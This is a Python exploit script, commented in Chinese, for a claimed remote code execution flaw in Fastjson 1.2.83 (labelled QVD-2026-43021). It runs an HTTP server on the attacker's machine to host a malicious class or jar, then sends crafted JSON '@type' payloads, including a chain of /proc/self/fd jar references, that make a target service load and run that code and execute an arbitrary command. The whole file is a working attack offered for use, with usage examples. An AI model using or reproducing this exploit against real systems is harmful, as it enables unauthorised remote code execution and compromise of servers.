#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fastjson 1.2.83 RCE (QVD-2026-43021)  hzhsec 版
  用法: python3 exp.py lhost lport target [options]

  必填:
    lhost       攻击机 IP (目标能访问到的地址)
    lport       攻击机 HTTP 端口 (用于托管恶意 class/jar)
    target      目标 URL (如 http://192.168.1.100:18080)

  选项:
    --endpoint  API 端点 (默认 /parse)
    --mode      利用模式: jdk8-http | fd | auto (默认 fd)
    --cmd       要执行的命令 (默认 id)
    --timeout   超时秒数 (默认 60, FD 模式建议 60+)
    --max-fd    FD 枚举上限 (默认 256)
    --tag       标签 (可选，用于区分多次测试)

  示例:
    python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http
    python3 exp.py 127.0.0.1 19090 http://127.0.0.1:18080 --mode fd --cmd "id>/tmp/x.txt"
"""

import os, sys, json, time, struct, socket, threading, subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.request

DIR = os.path.dirname(os.path.abspath(__file__))
LIB = os.path.join(DIR, "lib")
WWW = os.path.join(DIR, "www")


def log(msg):
    print(f"  {msg}")


def ip_int(ip):
    return str(struct.unpack("!I", socket.inet_aton(ip))[0])


def gen_probe(lhost, lport, cmd, mode, tag):
    sep = ";" if os.name == "nt" else ":"
    cp = sep.join([DIR, os.path.join(LIB, "asm-9.6.jar"), os.path.join(LIB, "fastjson-1.2.83.jar")])
    os.makedirs(WWW, exist_ok=True)

    # GenProbe 写 poc/www/ 相对于 CWD，所以把 CWD 设到 DIR 的父目录
    r = subprocess.run(
        ["java", "-cp", cp, "GenProbe", lhost, str(lport), cmd, mode, tag],
        capture_output=True, text=True, timeout=30,
        cwd=os.path.dirname(DIR)
    )
    for line in r.stdout.strip().split("\n"):
        if line.startswith("[+]"):
            log(line[4:].strip())
    if r.returncode != 0:
        log(f"[!] 生成失败: {r.stderr.strip()}")
    return r.returncode == 0


def start_http(port):
    class H(SimpleHTTPRequestHandler):
        def log_message(self, fmt, *a):
            pass

        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()

        def do_GET(self):
            path = self.translate_path(self.path)
            if os.path.isfile(path):
                self.send_response(200)
                self.end_headers()
                with open(path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()

    old = os.getcwd()
    os.chdir(WWW)
    s = HTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    return s, old


def send_payload(target, endpoint, payload, timeout):
    url = target.rstrip("/") + "/" + endpoint.lstrip("/")
    req = urllib.request.Request(url, data=payload.encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors="replace")[:300]
    except Exception as e:
        return None, str(e)


def exploit(lhost, lport, target, endpoint="/parse", mode="fd",
            cmd="id", tag="", max_fd=256, timeout=60):
    print(f"[*] Fastjson 1.2.83 RCE  |  mode={mode}  |  {target}{endpoint}")
    print(f"    攻击机: {lhost}:{lport}  命令: {cmd}")

    if not os.path.exists(os.path.join(DIR, "GenProbe.class")):
        return log("[-] 未找到 GenProbe.class，请先在目录下编译: javac -cp \"lib/*\" -d . GenProbe.java")

    if not gen_probe(lhost, lport, cmd, mode, tag):
        return log("[-] 探针生成失败")

    server, old = start_http(lport)
    time.sleep(0.3)

    pi = ip_int(lhost)
    if mode == "jdk8-http":
        cls = tag or "a"
        payload = json.dumps({"@type": f"http:..{pi}:{lport}.{cls}"})
        log(f"payload: http:..{pi}:{lport}.{cls}")
    else:
        pn = f"probe_{tag}" if tag else "probe"
        fc = f"T{tag}Exception" if tag else "Exception"
        items = [{"@type": f"jar:http:..{pi}:{lport}.{pn}!.foo.{fc}"}]
        for fd in range(3, max_fd + 1):
            items.append({"@type": f"jar:file:.proc.self.fd.{fd}!.fd{fd}.{fc}"})
        payload = json.dumps(items)
        log(f"payload: FD链 ({len(items)}个, fd 3~{max_fd})")

    log(f"发送 {len(payload)} 字节 ...")
    status, body = send_payload(target, endpoint, payload, timeout)
    if status:
        log(f"响应 {status}: {body[:200]}")
    else:
        log(f"请求超时 (可能已触发RCE): {body[:100]}")

    os.chdir(old)
    server.shutdown()


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Fastjson 1.2.83 RCE (QVD-2026-43021)")
    p.add_argument("lhost", help="攻击机 IP")
    p.add_argument("lport", type=int, help="攻击机端口")
    p.add_argument("target", help="目标 URL")
    p.add_argument("--endpoint", default="/parse", help="API 端点")
    p.add_argument("--mode", choices=["jdk8-http", "fd", "auto"], default="fd")
    p.add_argument("--cmd", default="id", help="执行的命令")
    p.add_argument("--timeout", type=int, default=60, help="超时秒数")
    p.add_argument("--max-fd", type=int, default=256, help="FD 上限")
    p.add_argument("--tag", default="", help="标签 (区分多次测试)")
    args = p.parse_args()

    if args.mode == "auto":
        tag = f"t{int(time.time())}"
        exploit(args.lhost, args.lport, args.target, args.endpoint,
                "jdk8-http", args.cmd, tag, args.max_fd, 15)
        exploit(args.lhost, args.lport, args.target, args.endpoint,
                "fd", args.cmd, tag, args.max_fd, args.timeout)
    else:
        exploit(args.lhost, args.lport, args.target, args.endpoint,
                args.mode, args.cmd, args.tag, args.max_fd, args.timeout)
